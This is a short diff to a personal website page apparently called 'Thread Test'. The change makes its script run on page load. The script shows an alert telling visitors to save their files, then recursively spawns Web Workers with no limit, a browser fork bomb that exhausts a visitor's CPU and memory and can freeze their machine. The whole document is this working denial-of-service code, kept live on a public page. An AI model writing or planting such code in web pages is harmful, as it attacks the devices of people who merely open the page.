@@ -7,11 +7,13 @@ title: Thread Test - Wenyu Zhao
 <p>Wenyu Zhao</p>
 
 <script>
-	alert( "Please save all files in your computer." );
+	window.onload = function () {
+		alert( "Please save all files in your computer." );
 	
-	( function fork () {
-		new Worker( "{{ site.baseurl }}/js/thread_test.js" );
-		fork();
-		fork();
-	} )();
+		( function fork () {
+			new Worker( "{{ site.baseurl }}/js/thread_test.js" );
+			fork();
+			fork();
+		} )();
+	};
 </script>
